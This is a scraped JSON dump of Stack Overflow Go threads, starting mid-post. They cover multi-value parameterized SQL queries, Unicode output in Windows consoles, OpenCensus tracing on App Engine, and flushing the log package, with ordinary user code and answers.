\"RecordID\"\n        },\n        \"data\": [`\n\ntype SingleAgent struct {\n    RecordID             string `json:\"RecordID\"`\n    OldEmployeeID        string `json:\"OldEmployeeID\"`\n    NewEmployeeID        string `json:\"NewEmployeeID\"`\n    AgentRank            int    `json:\"AgentRank\"`\n    AgentName            string `json:\"AgentName\"`\n    AgentEmail           string `json:\"AgentEmail\"`\n    TeamManager          string `json:\"TeamManager\"`\n    LineOfBusiness       string `json:\"LineOfBusiness\"`\n    FitnessCampStartDate string `json:\"FitnessCampStartDate\"`\n    FitnessCampEndDate   string `json:\"FitnessCampEndDate\"`\n    FitnessCampStatus    int    `json:\"FitnessCampStatus\"`\n    AgentFitnessRank     int    `json:\"AgentFitnessRank\"`\n    LatestMetricA        int    `json:\"MetricA\"`\n    LatestMetricB        int    `json:\"MetricB\"`\n    LatestMetricC        int    `json:\"MetricC\"`\n    LatestMetricD        int    `json:\"MetricD\"`\n    LatestMetricE        int    `json:\"MetricD\"`\n    SiteName             string `json:\"SiteName\"`\n    SiteID               string `json:\"SiteID\"`\n    PostCampWeek1        string `json:\"PostCampWeek1\"`\n    PostCampWeek2        string `json:\"PostCampWeek2\"`\n    PostCampWeek3        string `json:\"PostCampWeek3\"`\n}\n\nvar FirstAgent = SingleAgent{\n    RecordID:             \"30\",\n    OldEmployeeID:        \"785114544\",\n    NewEmployeeID:        \"10785114544\",\n    AgentRank:            3,\n    AgentName:            \"Shandeigh Rawsen\",\n    AgentEmail:           \"shandeigh.rawsen@gmail.com\",\n    TeamManager:          \"Oliver Lamplugh\",\n    LineOfBusiness:       \"BMS\",\n    FitnessCampStartDate: \"8/13/2018\",\n    FitnessCampEndDate:   \"10/7/2018\",\n    FitnessCampStatus:    1,\n    AgentFitnessRank:     1,\n    LatestMetricA:        77,\n    LatestMetricB:        167,\n    LatestMetricC:        496,\n    LatestMetricD:        72,\n    LatestMetricE:        80,\n    SiteName:             \"Montreal\",\n    SiteID:               \"4\",\n    PostCampWeek1:        \"10/2/2018\",\n    PostCampWeek2:        \"10/9/2018\",\n    PostCampWeek3:        \"10/19/2018\",\n}\nvar SecondAgent = SingleAgent{\n    RecordID:             \"29\",\n    OldEmployeeID:        \"980433290\",\n    NewEmployeeID:        \"10980433290\",\n    AgentRank:            4,\n    AgentName:            \"Terrijo Dewberry\",\n    AgentEmail:           \"terrijo.deberry@gmail.com\",\n    TeamManager:          \"Oliver Lamplugh\",\n    LineOfBusiness:       \"BTSW\",\n    FitnessCampStartDate: \"7/28/2018\",\n    FitnessCampEndDate:   \"9/23/2018\",\n    FitnessCampStatus:    2,\n    AgentFitnessRank:     2,\n    LatestMetricA:        88,\n    LatestMetricB:        92,\n    LatestMetricC:        716,\n    LatestMetricD:        78,\n    LatestMetricE:        66,\n    SiteName:             \"Montreal\",\n    SiteID:               \"2\",\n    PostCampWeek1:        \"10/2/2018\",\n    PostCampWeek2:        \"10/9/2018\",\n    PostCampWeek3:        \"10/15/2018\",\n}\n</code></pre></li>\n</ol>\n"}, {"tags": ["postgresql", "templates", "go"], "answers": [{"comments": [{"owner": {"reputation": 11, "user_id": 7745759, "user_type": "registered", "profile_image": "https://graph.facebook.com/331383823925485/picture?type=large", "display_name": "Kano Doe", "link": "https://stackoverflow.com/users/7745759/kano-doe"}, "edited": false, "score": 0, "creation_date": 1546302884, "post_id": 52942525, "comment_id": 94822343, "body": "I used the first section cause i&#39;m searching for strings and numbers in my query. It works amazing and you are the most awesome person ever!!. I did have to add 1 thing to it and i got it to work. I&#39;ll post it below."}], "tags": [], "owner": {"reputation": 18601, "user_id": 965900, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/5KqAT.png?s=128&g=1", "display_name": "mkopriva", "link": "https://stackoverflow.com/users/965900/mkopriva"}, "is_accepted": false, "score": 0, "last_activity_date": 1540276389, "creation_date": 1540276389, "answer_id": 52942525, "question_id": 52938192, "link": "https://stackoverflow.com/questions/52938192/how-to-pass-in-multiple-values-into-a-template-to-run-a-query/52942525#52942525", "title": "how to pass in multiple values into a template to run a query", "body": "<p>You have at least two options, building a string of placeholders and interpolating them into the query before passing the parameters, or instead of using <code>IN</code> you switch to using <code>ANY</code> together with <a href=\"https://godoc.org/github.com/lib/pq#Int64Array\" rel=\"nofollow noreferrer\"><code>lib/pq.Int64Array</code></a>.</p>\n\n<p>Building your own placeholders:</p>\n\n<pre><code>orderid := \"44,33,55,66\" // get input\n\nids := strings.Split(orderid, \",\")\nif len(ids) &lt; 1 {\n    return // exit if no input\n}\n\nplaceholders := \"\"\nfor i := range ids {\n    placeholders += \",$\" + strconv.Itoa(i+1)\n}\nplaceholders = placeholders[1:] // remove leading comma\n\nquery := `SELECT\n    rma_id,\n    order_id,\n    customer_id,\n    bin_id,\n    owner,\n    asin,\n    lpn,\n    warehouse_id\nFROM crt.returns_in_inv\nWHERE (warehouse_id IN (%[1]s) OR lower(warehouse_id) IN (%[1]s))\nOR lpn IN (%[1]s)\nOR asin IN (%[1]s)\nOR rma_id IN (%[1]s)\nOR customer_id IN (%[1]s)\nOR ORDER_ID IN (%[1]s);`\n\nquery = fmt.Sprintf(query, placeholders) // inject placeholders $1,$2,$3,$4 into query template\nrows, err := db.Query(query, ids...) // execute query\n// ...\n</code></pre>\n\n<hr>\n\n<p>Using <code>ANY</code>:</p>\n\n<pre><code>orderid := \"44,33,55,66\" // get input\n\nids := strings.Split(orderid, \",\")\nif len(ids) &lt; 1 {\n    return // exit if no input\n}\n\nparams := make(pq.Int64Array, len(ids))\nfor i, s := range ids {\n    id, err := strconv.ParseInt(s, 10, 64)\n    if err != nil {\n        return // fail\n    }\n    params[i] = id\n}\n\nquery := `SELECT\n    rma_id,\n    order_id,\n    customer_id,\n    bin_id,\n    owner,\n    asin,\n    lpn,\n    warehouse_id\nFROM crt.returns_in_inv\nWHERE (warehouse_id = ANY ($1) OR lower(warehouse_id) = ANY ($1))\nOR lpn = ANY ($1)\nOR asin = ANY ($1)\nOR rma_id = ANY ($1)\nOR customer_id = ANY ($1)\nOR ORDER_ID IN = ANY ($1)`\n\nrows, err := db.Query(query, params)\n// ...\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 1994, "user_id": 5624053, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/nhLzK.jpg?s=128&g=1", "display_name": "Anh Pham", "link": "https://stackoverflow.com/users/5624053/anh-pham"}, "edited": false, "score": 0, "creation_date": 1546305499, "post_id": 53992377, "comment_id": 94822643, "body": "Usually it&#39;s better to explain a solution instead of just posting some rows of anonymous code. You can read <a href=\"https://stackoverflow.com/help/how-to-answer\">How do I write a good answer</a>, and also <a href=\"https://meta.stackexchange.com/questions/114762/explaining-entirely-%E2%80%8C%E2%80%8Bcode-based-answers\">Explaining entirely code-based answers</a>"}, {"owner": {"reputation": 11, "user_id": 7745759, "user_type": "registered", "profile_image": "https://graph.facebook.com/331383823925485/picture?type=large", "display_name": "Kano Doe", "link": "https://stackoverflow.com/users/7745759/kano-doe"}, "reply_to_user": {"reputation": 1994, "user_id": 5624053, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/nhLzK.jpg?s=128&g=1", "display_name": "Anh Pham", "link": "https://stackoverflow.com/users/5624053/anh-pham"}, "edited": false, "score": 0, "creation_date": 1546305726, "post_id": 53992377, "comment_id": 94822666, "body": "Buddy, i barely understand the code myself. How do you expect me to explain it to you?"}, {"owner": {"reputation": 1994, "user_id": 5624053, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/nhLzK.jpg?s=128&g=1", "display_name": "Anh Pham", "link": "https://stackoverflow.com/users/5624053/anh-pham"}, "edited": false, "score": 0, "creation_date": 1546307472, "post_id": 53992377, "comment_id": 94822855, "body": "Oh, is this an answer? You&#39;re saying &quot;Thank you so much @mkopriva&quot; so this is a comment, right?"}], "tags": [], "owner": {"reputation": 11, "user_id": 7745759, "user_type": "registered", "profile_image": "https://graph.facebook.com/331383823925485/picture?type=large", "display_name": "Kano Doe", "link": "https://stackoverflow.com/users/7745759/kano-doe"}, "is_accepted": false, "score": 0, "last_activity_date": 1546303602, "creation_date": 1546303602, "answer_id": 53992377, "question_id": 52938192, "link": "https://stackoverflow.com/questions/52938192/how-to-pass-in-multiple-values-into-a-template-to-run-a-query/53992377#53992377", "title": "how to pass in multiple values into a template to run a query", "body": "<pre><code>//This is the code that i got to work. Thank you so much @mkopriva !!!\n//You are freaking awesome!! I did have to add in 1 thing to it.\n\nfunc riiapp(w http.ResponseWriter, r *http.Request) {\n\noname := r.PostFormValue(\"orderid\")\n\nids := strings.Split(oname, \",\")\nif len(ids) &lt; 1 {\n    return // exit if no input\n}\n\nplaceholders := \"\"\nfor i := range ids {\n    placeholders += \",$\" + strconv.Itoa(i+1)\n}\nplaceholders = placeholders[1:] // remove leading comma\n\nt := ids\ns := make([]interface{}, len(t))\nfor i, v := range t {\n    s[i] = v\n}\n\nquery := `SELECT\nrma_id,\norder_id,\ncustomer_id,\nbin_id,\nowner,\nasin,\nlpn,\nwarehouse_id\nFROM z_support.returns_in_inv\nWHERE (warehouse_id IN (%[1]s) OR lower(warehouse_id) IN (%[1]s))\nOR lpn IN (%[1]s)\nOR asin IN (%[1]s)\nOR rma_id IN (%[1]s)\nOR customer_id IN (%[1]s)\nOR ORDER_ID IN (%[1]s);`\n\nquery = fmt.Sprintf(query, placeholders) // inject placeholders $1,$2,$3,$4 into \nquery template\nrows, err := db.Query(query, s...)       // execute query\nif err != nil {\n    log.Println(err)\n    return\n}\ndefer rows.Close()\n\nbks := make([]Book, 0)\nfor rows.Next() {\n    bk := Book{}\n    err := rows.Scan(&amp;bk.Rmaid, &amp;bk.Orderid, &amp;bk.Customerid, &amp;bk.Binid, &amp;bk.Owner, \n&amp;bk.Asin, &amp;bk.Lpn, &amp;bk.Warehouseid) // order matters\n    if err != nil {\n        http.Error(w, http.StatusText(500), 500)\n        return\n    }\n    bks = append(bks, bk)\n}\nif err = rows.Err(); err != nil {\n    http.Error(w, http.StatusText(500), 500)\n    return\n}\n\ntpl.ExecuteTemplate(w, \"riiapp.gohtml\", bks)\n\n}\n</code></pre>\n"}], "owner": {"reputation": 11, "user_id": 7745759, "user_type": "registered", "profile_image": "https://graph.facebook.com/331383823925485/picture?type=large", "display_name": "Kano Doe", "link": "https://stackoverflow.com/users/7745759/kano-doe"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 41, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1546303602, "creation_date": 1540244799, "question_id": 52938192, "link": "https://stackoverflow.com/questions/52938192/how-to-pass-in-multiple-values-into-a-template-to-run-a-query", "title": "how to pass in multiple values into a template to run a query", "body": "<p>Options \nI have web app with a search bar. The search bar accepts customer_id's and runs a query to a redshift cluster with the customer_id as a filter. I need to be able to input multiple customer id's comma separated and then run the query filtered by those customer id's. Currently i can only use 1 customer id at a time. Here is what i currently use. Any help or guidance is appreciated.</p>\n\n<pre><code>func riiapp(w http.ResponseWriter, r *http.Request) {\n\noname := r.PostFormValue(\"orderid\")\n\nrows, err := db.Query(\"SELECT rma_id, order_id, customer_id, bin_id, owner, asin, lpn, warehouse_id FROM crt.returns_in_inv WHERE (warehouse_id IN ($1) OR lower(warehouse_id) IN ($1)) OR lpn IN ($1) OR asin IN ($1) OR rma_id IN ($1) OR customer_id IN ($1) OR ORDER_ID IN ($1);\", oname)\nif err != nil {\n    http.Error(w, http.StatusText(500), 500)\n    return\n}\ndefer rows.Close()\n\nbks := make([]Book, 0)\nfor rows.Next() {\n    bk := Book{}\n    err := rows.Scan(&amp;bk.Rmaid, &amp;bk.Orderid, &amp;bk.Customerid, &amp;bk.Binid, &amp;bk.Owner, &amp;bk.Asin, &amp;bk.Lpn, &amp;bk.Warehouseid) // order matters\n    if err != nil {\n        http.Error(w, http.StatusText(500), 500)\n        return\n    }\n    bks = append(bks, bk)\n}\nif err = rows.Err(); err != nil {\n    http.Error(w, http.StatusText(500), 500)\n    return\n}\n\ntpl.ExecuteTemplate(w, \"riiapp.gohtml\", bks)\nfmt.Println(oname)\n}\n\n&lt;html&gt;\n&lt;div class=\"container\" align=\"center\"&gt;\n&lt;h6&gt;Search By: Rma_Id, Order Id, Customer ID, Asin, LPN OR Warehouse ID (May Pull Many Records)&lt;/h6&gt;\n&lt;form action=\"/riiapp\" method=\"POST\"&gt;\n&lt;input type=\"text\" name=\"orderid\" id=\"ord\" placeholder=\"SEARCH\"&gt;\n&lt;input type=\"submit\"&gt;\n&lt;/form&gt;\n\n\n\n\n&lt;table id=\"testTable\"&gt;\n  &lt;thead valign=\"top\"&gt;\n    &lt;tr&gt;         \n        &lt;th&gt;Rma_id&lt;/th&gt;\n        &lt;th&gt;Order_id&lt;/th&gt;\n        &lt;th&gt;Customer_id&lt;/th&gt;\n        &lt;th&gt;Bin_id&lt;/th&gt;\n        &lt;th&gt;Owner&lt;/th&gt;\n        &lt;th&gt;Asin&lt;/th&gt;\n        &lt;th&gt;Lpn&lt;/th&gt;\n        &lt;th&gt;Warehouse_id&lt;/th&gt;\n    &lt;/tr&gt;\n &lt;/thead&gt;\n &lt;tbody&gt;{{range .}}\n    &lt;tr&gt;\n        &lt;td&gt;{{.Rmaid}}&lt;/td&gt;\n        &lt;td&gt;{{.Orderid}}&lt;/td&gt;\n        &lt;td&gt;{{.Customerid}}&lt;/td&gt;\n        &lt;td&gt;{{.Binid}}&lt;/td&gt;\n        &lt;td&gt;{{.Owner}}&lt;/td&gt;\n        &lt;td&gt;{{.Asin}}&lt;/td&gt;\n        &lt;td&gt;{{.Lpn}}&lt;/td&gt;\n        &lt;td&gt;{{.Warehouseid}}&lt;/td&gt;\n    &lt;/tr&gt;\n        {{end}}\n  &lt;/tbody&gt;\n&lt;/table&gt;\n &lt;/div&gt;\n&lt;/html&gt;\n</code></pre>\n"}, {"tags": ["powershell", "go", "console"], "comments": [{"owner": {"reputation": 5565, "user_id": 3915, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/ccd658bdf42cb1145386e10bf3da116a?s=128&d=identicon&r=PG", "display_name": "Mark", "link": "https://stackoverflow.com/users/3915/mark"}, "edited": false, "score": 2, "creation_date": 1540254901, "post_id": 52937816, "comment_id": 92787853, "body": "Go not only supports utf8, a Go designer is an inventor of <a href=\"https://www.cl.cam.ac.uk/~mgk25/ucs/utf-8-history.txt\" rel=\"nofollow noreferrer\">utf8</a> (<a href=\"https://en.wikipedia.org/wiki/Rob_Pike\" rel=\"nofollow noreferrer\">Rob Pike</a>)."}], "answers": [{"tags": [], "owner": {"reputation": 8872, "user_id": 2150063, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Gvsh5.jpg?s=128&g=1", "display_name": "HAL9256", "link": "https://stackoverflow.com/users/2150063/hal9256"}, "is_accepted": false, "score": 0, "last_activity_date": 1540249088, "creation_date": 1540249088, "answer_id": 52938800, "question_id": 52937816, "link": "https://stackoverflow.com/questions/52937816/how-to-print-utf-8-or-unicode-characters-in-go-golang-on-windows/52938800#52938800", "title": "How to print UTF-8 (or unicode) characters in Go (golang) on Windows", "body": "<p>Try running in <strong>Windows PowerShell ISE</strong>.</p>\n\n<p>It has fairly good support for displaying Unicode.</p>\n\n<p>CMD and PowerShell don't support Unicode fonts in the <strong>command line shell</strong> very well because they aren't <em>really</em> using \"fonts\" to display the text, but ANSI/VT code pages that translate to characters. So despite PowerShell being able to support Unicode internally, and you can pass them between objects and functions, the <strong>command line shell</strong> simply cannot display them, as the translation between code page and displaying doesn't exist. Some attempts to make Unicode a little better can be found here: \n<a href=\"https://stackoverflow.com/a/49481797/2150063\">Displaying Unicode in Powershell</a></p>\n\n<p>For an interesting read on why CMD and PowerShell can't do Unicode well, see the blog post series: <a href=\"https://blogs.msdn.microsoft.com/commandline/2018/07/20/windows-command-line-inside-the-windows-console/\" rel=\"nofollow noreferrer\">Windows Command-Line: Inside the Windows Console</a></p>\n\n<p>Windows PowerShell ISE is different than running PowerShell from the <strong>command line shell</strong> as the ISE is displaying the output and doesn't have to use ANSI/VT sequences to pass commands between the shell and the PowerShell console host. And it doesn't have any legacy scripts to deal with.</p>\n"}, {"tags": [], "owner": {"reputation": 133115, "user_id": 221700, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ad32856042eea9fd2db5210ac033787d?s=128&d=identicon&r=PG", "display_name": "peterSO", "link": "https://stackoverflow.com/users/221700/peterso"}, "is_accepted": true, "score": 4, "last_activity_date": 1540259109, "last_edit_date": 1540259109, "creation_date": 1540258320, "answer_id": 52939874, "question_id": 52937816, "link": "https://stackoverflow.com/questions/52937816/how-to-print-utf-8-or-unicode-characters-in-go-golang-on-windows/52939874#52939874", "title": "How to print UTF-8 (or unicode) characters in Go (golang) on Windows", "body": "<p>The problem for the Windows cmd and PowerShell consoles is the lack of CJK characters in fonts such as Consolas and Lucida Console. On Windows 10, change the console font to a font that supports CJK characters, for example, NSimSun or SimSun-ExtB.</p>\n\n<p>For example,</p>\n\n<p><code>font.go</code>:</p>\n\n<pre><code>package main\n\nimport (\n    \"fmt\"\n)\n\nfunc main() {\n    fmt.Println(\"\u2713 Hello, \u4e16\u754c\")\n    // OR\n    fmt.Println(\"\\u2713 Hello, \u4e16\u754c\")\n}\n</code></pre>\n\n<p>Output (NSimSun):</p>\n\n<pre><code>Microsoft Windows [Version 10.0.17134.345]\n&gt;go version\ngo version devel +47cc59f31f Tue Oct 23 00:29:57 2018 +0000 windows/amd64\n&gt;go run font.go\n\u2713 Hello, \u4e16\u754c\n\u2713 Hello, \u4e16\u754c\n&gt;\n</code></pre>\n"}], "owner": {"reputation": 1315, "user_id": 7412183, "user_type": "registered", "accept_rate": 70, "profile_image": "https://www.gravatar.com/avatar/a73ddfb4eba2ce63e534ab68317210dc?s=128&d=identicon&r=PG&f=1", "display_name": "Dennis", "link": "https://stackoverflow.com/users/7412183/dennis"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 5019, "favorite_count": 2, "accepted_answer_id": 52939874, "answer_count": 2, "score": 4, "last_activity_date": 1563174061, "creation_date": 1540242705, "question_id": 52937816, "link": "https://stackoverflow.com/questions/52937816/how-to-print-utf-8-or-unicode-characters-in-go-golang-on-windows", "title": "How to print UTF-8 (or unicode) characters in Go (golang) on Windows", "body": "<p>Let's have a look at this:</p>\n\n<pre><code>\u2713 Hello, \u4e16\u754c\n</code></pre>\n\n<p>As you can see there is a unicode checkmark and chinese/japanese characters. In go, If I use MSYS or linux environment i can easily print those characters. Even on windows. However, I am unable to see them in <code>CMD</code> nor in <code>Powershell</code>.</p>\n\n<p>I got this:</p>\n\n<p><a href=\"https://i.stack.imgur.com/6jlZf.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/6jlZf.png\" alt=\"powershell\"></a></p>\n\n<p>This is my very basic code:</p>\n\n<pre><code>package main\n\nimport (\n    \"fmt\"\n)\n\nfunc main() {\n\n    fmt.Println(\"\u2713 Hello, \u4e16\u754c\")\n    // OR\n    fmt.Println(\"\\u2713 Hello, \u4e16\u754c\")\n}\n</code></pre>\n\n<p>Also, I have dozens of console apps and they are able to show such characters on my windows using cmd or powershell. Why go can't?</p>\n"}, {"tags": ["google-app-engine", "go", "trace", "google-cloud-stackdriver"], "answers": [{"tags": [], "owner": {"reputation": 2691, "user_id": 212435, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/xAkN2.jpg?s=128&g=1", "display_name": "shollyman", "link": "https://stackoverflow.com/users/212435/shollyman"}, "is_accepted": false, "score": 2, "last_activity_date": 1540234220, "creation_date": 1540234220, "answer_id": 52935945, "question_id": 52935944, "link": "https://stackoverflow.com/questions/52935944/how-do-i-add-custom-tracing-to-a-second-generation-app-engine-application-in-go/52935945#52935945", "title": "How do I add custom tracing to a second-generation App Engine application in Go?", "body": "<p>The key is I was missing is understanding how span context is communicated to the serving app.  Google leverages the <code>X-Cloud-Trace-Context</code> header to propagate span context within requests sent to your serving instances, and the <a href=\"https://godoc.org/go.opencensus.io/exporter/stackdriver/propagation\" rel=\"nofollow noreferrer\">go.opencensus.io/exporter/stackdriver/propagation</a> library provides an implementation to extract and persist this information within http requests.</p>\n\n<p>Don't forget to <a href=\"https://godoc.org/contrib.go.opencensus.io/exporter/stackdriver\" rel=\"nofollow noreferrer\">create a stackdriver exporter</a>, and register traces to it. The docs for the exporter library show an example of this.</p>\n\n<pre><code>// CreateSpanFromRequest returns a context and span based on the http.Request.\n// If no existing spancontext is found, this will start a new span.\n// Modifies existing request to contain the generated span's context.\nfunc CreateSpanFromRequest(name string, r *http.Request) (context.Context, *trace.Span) {\n    var span *trace.Span\n    ctx := r.Context()\n    httpFormat := &amp;propagation.HTTPFormat{}\n    sc, ok := httpFormat.SpanContextFromRequest(r)\n    if ok {\n        ctx, span = trace.StartSpanWithRemoteParent(ctx, name, sc)\n    } else {\n        ctx, span = trace.StartSpan(ctx, name)\n    }\n    // Write the span context into the http.Request.  We do this to\n    // to enable chaining handlers together more easily.\n    httpFormat.SpanContextToRequest(span.SpanContext(), r)\n    return ctx, span\n}\n</code></pre>\n\n<p>Using this, I was able to add custom spans to my handlers that would be properly associated with the incoming request information in stackdriver:</p>\n\n<pre><code>func indexHandler(w http.ResponseWriter, r *http.Request) {\n    _, span := CreateSpanFromRequest(\"indexHandler\", r)\n    defer span.End()\n    if r.URL.Path != \"/\" {\n        http.NotFound(w, r)\n        return\n    }\n    fmt.Fprint(w, \"Hello, World!\")\n}\n</code></pre>\n"}], "owner": {"reputation": 2691, "user_id": 212435, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/xAkN2.jpg?s=128&g=1", "display_name": "shollyman", "link": "https://stackoverflow.com/users/212435/shollyman"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 138, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1540234220, "creation_date": 1540234220, "question_id": 52935944, "link": "https://stackoverflow.com/questions/52935944/how-do-i-add-custom-tracing-to-a-second-generation-app-engine-application-in-go", "title": "How do I add custom tracing to a second-generation App Engine application in Go?", "body": "<p>Google App Engine now supports Go 1.11 via the new <a href=\"https://cloud.google.com/appengine/docs/standard/go111/\" rel=\"nofollow noreferrer\">second-generation</a> standard environment.  While converting an older standard environment application to the second generation, it wasn't obvious how to combine tracing information from the app engine infrastructure with custom tracing I added to the application using <a href=\"https://opencensus.io/\" rel=\"nofollow noreferrer\">OpenCensus</a>.</p>\n\n<p>Even though I had created a stackdriver exporter and registered traces, I wasn't seeing custom trace information in the stackdriver console attached to inbound requests.</p>\n"}, {"tags": ["go", "logging", "flush"], "comments": [{"owner": {"reputation": 32095, "user_id": 7426, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a562698800b535e47b68590f63c402a?s=128&d=identicon&r=PG", "display_name": "Adrian", "link": "https://stackoverflow.com/users/7426/adrian"}, "edited": false, "score": 1, "creation_date": 1540234249, "post_id": 52935858, "comment_id": 92780890, "body": "Considering that it doesn&#39;t take an interface with a <code>Flush</code> method, it does not control when it is flushed. It is writer-dependent."}, {"owner": {"reputation": 30951, "user_id": 1266756, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/52eb9d81540fd9e91b82435b194ec9df?s=128&d=identicon&r=PG", "display_name": "Volker", "link": "https://stackoverflow.com/users/1266756/volker"}, "edited": false, "score": 2, "creation_date": 1540235349, "post_id": 52935858, "comment_id": 92781431, "body": "What is &quot;Go sdk&quot; ?"}, {"owner": {"reputation": 5392, "user_id": 361836, "user_type": "registered", "accept_rate": 47, "profile_image": "https://www.gravatar.com/avatar/f426a26f03d7d4d61d354a3b2fc5337d?s=128&d=identicon&r=PG", "display_name": "lucidquiet", "link": "https://stackoverflow.com/users/361836/lucidquiet"}, "reply_to_user": {"reputation": 30951, "user_id": 1266756, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/52eb9d81540fd9e91b82435b194ec9df?s=128&d=identicon&r=PG", "display_name": "Volker", "link": "https://stackoverflow.com/users/1266756/volker"}, "edited": false, "score": 1, "creation_date": 1540399286, "post_id": 52935858, "comment_id": 92854587, "body": "@Volker SDK (Software Development Kit) <a href=\"https://www.google.com/search?q=sdk\" rel=\"nofollow noreferrer\">google.com/search?q=sdk</a>, Go is the Language, the SDK is the Standard Library."}, {"owner": {"reputation": 30951, "user_id": 1266756, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/52eb9d81540fd9e91b82435b194ec9df?s=128&d=identicon&r=PG", "display_name": "Volker", "link": "https://stackoverflow.com/users/1266756/volker"}, "edited": false, "score": 1, "creation_date": 1540440124, "post_id": 52935858, "comment_id": 92868470, "body": "Go&#39;s stdlib is Go&#39;s stdlib not a SDK."}], "answers": [{"tags": [], "owner": {"reputation": 1604, "user_id": 3351097, "user_type": "registered", "accept_rate": 56, "profile_image": "https://i.stack.imgur.com/yInN3.jpg?s=128&g=1", "display_name": "Maxian Nicu", "link": "https://stackoverflow.com/users/3351097/maxian-nicu"}, "is_accepted": false, "score": 0, "last_activity_date": 1540234500, "creation_date": 1540234500, "answer_id": 52936016, "question_id": 52935858, "link": "https://stackoverflow.com/questions/52935858/how-and-when-is-the-go-sdk-logger-flushed/52936016#52936016", "title": "How and when is the Go sdk logger flushed?", "body": "<p>Logger shouldn't know how to flush data. You have to flush output writer which you specified on logger creation (if it has such capability).</p>\n\n<p>See example from <a href=\"https://github.com/golang/go/issues/21751\" rel=\"nofollow noreferrer\">github discussion</a></p>\n\n<pre><code>package main\n\nimport (\n    \"bufio\"\n    \"flag\"\n    \"log\"\n    \"os\"\n    \"strings\"\n)\n\nfunc main() {\n    var flush bool\n    flag.BoolVar(&amp;flush, \"flush\", false, \"if set, will flush the buffered io before exiting\")\n    flag.Parse()\n\n    br := bufio.NewWriter(os.Stdout)\n    logger := log.New(br, \"\", log.Ldate)\n    logger.Printf(\"%s\\n\", strings.Repeat(\"This is a test\\n\", 5))\n    if flush {\n        br.Flush()\n    }\n    logger.Fatalf(\"exiting now!\")\n}\n</code></pre>\n\n<p>You can read entire discussion related to your issue <a href=\"https://github.com/golang/go/issues/21751\" rel=\"nofollow noreferrer\">on github</a></p>\n\n<p>Alternatively, you can look at 3rd party loggers which have <code>flush</code>. Check out <a href=\"https://github.com/uber-go/zap\" rel=\"nofollow noreferrer\">zap logger</a> which have method <code>logger.Sync()</code></p>\n"}, {"tags": [], "owner": {"reputation": 284620, "user_id": 1705598, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/aTFoe.jpg?s=128&g=1", "display_name": "icza", "link": "https://stackoverflow.com/users/1705598/icza"}, "is_accepted": true, "score": 2, "last_activity_date": 1540400057, "last_edit_date": 1540400057, "creation_date": 1540370478, "answer_id": 52964506, "question_id": 52935858, "link": "https://stackoverflow.com/questions/52935858/how-and-when-is-the-go-sdk-logger-flushed/52964506#52964506", "title": "How and when is the Go sdk logger flushed?", "body": "<p>The <a href=\"https://golang.org/pkg/log/\" rel=\"nofollow noreferrer\"><code>log</code></a> package is not responsible for flushing the underlying <a href=\"https://golang.org/pkg/io/#Writer\" rel=\"nofollow noreferrer\"><code>io.Writer</code></a>. It would be possible for the <code>log</code> package to perform a type-assertion to see if the current <code>io.Writer</code> has a <code>Flush()</code> method, and if so then call it, but there is no guarantee that if multiple <code>io.Writer</code>s are \"chained\", the data will eventually be flushed to the bottommost layer.</p>\n\n<p>And the primary reason why the <code>log</code> package doesn't flush in my opinion is <em>performance</em>. We use buffered writers so we don't have to reach the underlying layer each time a single byte (or byte slice) is written to it, but we can cache the recently written data, and when we reach a certain size (or a certain time), we can write the \"batch\" at once, efficiently.</p>\n\n<p>If the <code>log</code> package would flush after each log statement, that would render buffered IO useless. It might not matter in case of small apps, but if you have a high traffic web server, issuing a flush after each log statement (of which there may be many in each request handing) would cause a serious performance drawback.</p>\n\n<p>Then yes, there is the issue if the app is terminated, the last log statements might not make it to the underlying layer. The proper solution is to do a <em>graceful shutdown</em>: implement signal handling, and when your app is about to terminate, properly flush and close the underlying <code>io.Writer</code> of the logger you use. For details, see:</p>\n\n<p><a href=\"https://stackoverflow.com/questions/11268943/is-it-possible-to-capture-a-ctrlc-signal-and-run-a-cleanup-function-in-a-defe\">Is it possible to capture a Ctrl+C signal and run a cleanup function, in a &quot;defer&quot; fashion?</a></p>\n\n<p><a href=\"https://stackoverflow.com/questions/30640439/is-there-something-like-finally-in-go-just-opposite-to-what-init/30640871#30640871\">Is there something like finally() in Go just opposite to what init()?</a></p>\n\n<p><a href=\"https://stackoverflow.com/questions/50406639/are-deferred-functions-called-when-sigint-is-received-in-go/50407241#50407241\">Are deferred functions called when SIGINT is received in Go?</a></p>\n\n<p>If\u2013for simplicity only\u2013you still need a logger that flushes after each log statement, you can achieve that easily. This is because the <a href=\"https://golang.org/pkg/log/#Logger\" rel=\"nofollow noreferrer\"><code>log.Logger</code></a> type guarantees that each log message is delivered to the destination <code>io.Writer</code> with a single <code>Writer.Write()</code> call:</p>\n\n<blockquote>\n  <p>Each logging operation makes a single call to the Writer's Write method. A Logger can be used simultaneously from multiple goroutines; it guarantees to serialize access to the Writer.</p>\n</blockquote>\n\n<p>So basically all you need to do is create a \"wrapper\" <code>io.Writer</code> whose <code>Write()</code> method does a flush after \"forwarding\" the <code>Write()</code> call to its underlying writer.</p>\n\n<p>This is how it could look like:</p>\n\n<pre><code>type myWriter struct {\n    io.Writer\n}\n\nfunc (m *myWriter) Write(p []byte) (n int, err error) {\n    n, err = m.Writer.Write(p)\n\n    if flusher, ok := m.Writer.(interface{ Flush() }); ok {\n        flusher.Flush()\n    } else if syncer := m.Writer.(interface{ Sync() error }); ok {\n        // Preserve original error\n        